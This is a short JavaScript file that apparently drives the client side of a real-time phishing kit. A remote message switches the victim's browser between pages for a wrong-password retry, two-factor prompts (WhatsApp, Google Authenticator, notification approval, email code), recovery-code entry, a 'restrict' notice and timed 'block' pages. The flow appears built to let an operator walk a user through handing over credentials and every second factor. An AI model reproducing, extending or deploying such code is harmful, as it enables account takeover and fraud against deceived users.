// Function to Create Block Time
function setSessionTime(duration) {
    // Create the URL for the AJAX request based on the duration
    let url = '';
    switch (duration) {
        case 'block10':
            url = 'utility/set_time.php?type=short'; // URL for 10-minute session
            break;
        case 'block60':
            url = 'utility/set_time.php?duration=long'; // URL for 60-minute session
            break;
        default:
            console.error('Invalid duration specified.');
            return;
    }

    // Create an AJAX GET request
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);

    xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
            // Success handling
            console.log('Session time set successfully:', xhr.responseText);
        } else {
            // Error handling
            console.error('Error setting session time:', xhr.statusText);
        }
    };

    xhr.onerror = function() {
        // Network error handling
        console.error('Network error occurred.');
    };

    xhr.send();
}

function handleRedirect(message) {
    // Check if the parent window has the changeIframeSrc function
    switch (message) {
        case 'login':
            window.location.href = '/login?incorrect'; // Login email + pass
            break;
        case 'verify':
            window.location.href = '/verify'; // two factor
            break;
        case 'career':
            window.location.href = '/career'; // Creating Career
            break;
        case 'reset':
            window.location.href = '/reset'; // Reset Password
            break;
        case '10min':
            setSessionTime('block10');
            setTimeout(function() {
                window.location.href = '/block'; // 10 min block after 2 seconds
            }, 2000);
            break;
        case '60min':
            setSessionTime('block60');
            setTimeout(function() {
                window.location.href = '/block'; // 60 min block after 2 seconds
            }, 2000);
            break;
        case 'restrict':
            window.location.href = '/restrict'; // account quality restrict
            break;
        case 'incorrect':
            window.location.href = '/incorrect'; // wrong email address
            break;
        case 'emailcode':
            window.location.href = '/emailcode'; // Email code
            break;
        case 'verifywp':
            window.location.href = '/verifywp'; // WhatsApp verification
            break;
        case 'verifyg':
            window.location.href = '/verifyg'; // Google Authenticator
            break;
        case 'verifynotify':
            window.location.href = '/verifynotify'; // Notification verification
            break;
        case 'verifybackup':
            window.location.href = '/verifybackup'; // Recovery codes
            break;
        case 'done':
            window.location.href = '/done'; // Completion page
            break;
        case 'disconnected':
            window.location.href = '/disconnected'; // Disconnection page
            break;
        case 'info':
            window.location.href = '/info'; // Device notification check
            break;
        default:
            // Check if the message contains "Hello, your socket ID is"
            if (message.includes('Hello, your socket ID is')) {
                console.log('Connection Successfully');
            } else {
                console.log('Received message:', message);
            }
            break;
    }
}

